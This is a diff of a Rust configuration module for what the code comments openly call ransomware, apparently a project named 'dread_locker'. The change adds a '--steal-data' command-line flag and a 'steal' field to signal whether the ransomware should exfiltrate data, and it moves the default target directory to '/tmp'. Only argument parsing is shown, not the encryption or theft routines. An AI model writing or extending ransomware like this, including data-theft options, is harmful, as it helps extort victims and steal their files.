@@ -1,14 +1,15 @@
 pub struct Config{          // Will contain the required configuration for the ransomware to work 
     root_directory: String, // For example: the directory to encrypt
     encryption_type: u8,    // Or the cypher type to use
-                            // Etc...
+    steal: bool,       // Or if the ransomware should steal data    
     decryption: bool,
 }
 impl Config {
     pub fn new(args: Vec<String>) -> Result<Config, &'static str> {
         let mut encryption_type: u8 = 0;
         let mut decryption_val: bool = false;
-        let test_dir: String = String::from("/mnt/f/Programming/Rust/dread_locker/test_dir");
+        let mut steal_val: bool = false;
+        let test_dir: String = String::from("/tmp");
         let directory;
         let zero = String::from("0"); // TODO
         // this param only exists to prevent unwanted executions
@@ -18,7 +19,7 @@ impl Config {
         if args[2].parse::<i32>().unwrap() != 1234 {
             return Err("Invalid execution key ");
         }
-        let mut iterable_args = args.iter();
+        let iterable_args = args.iter();
         // handling the param --encryption-type
         if let Some(i) = iterable_args.clone().position(|x| x.trim().to_lowercase() == "--encryption-type"){
             let encryption_type_str = args.get(i+1).unwrap_or_else(||{
@@ -44,9 +45,13 @@ impl Config {
             println!("'--root-folder' parameter not found. Defaulting to the test directory");
             directory = test_dir;
         }
+        if let Some(_) = iterable_args.clone().position(|x| x.trim().to_lowercase() == "--steal-data"){
+            steal_val = true;
+        }
         Ok(Config{
             encryption_type : encryption_type,
             decryption : decryption_val,
+            steal : steal_val,
             root_directory: directory,
         })
     }
@@ -61,5 +66,8 @@ impl Config {
     }
     pub fn edit_dir(&mut self, new_dir: String) {
         self.root_directory = new_dir;
+    }
+    pub fn steal(&self) -> bool {
+        return self.steal.clone();
     }
 }
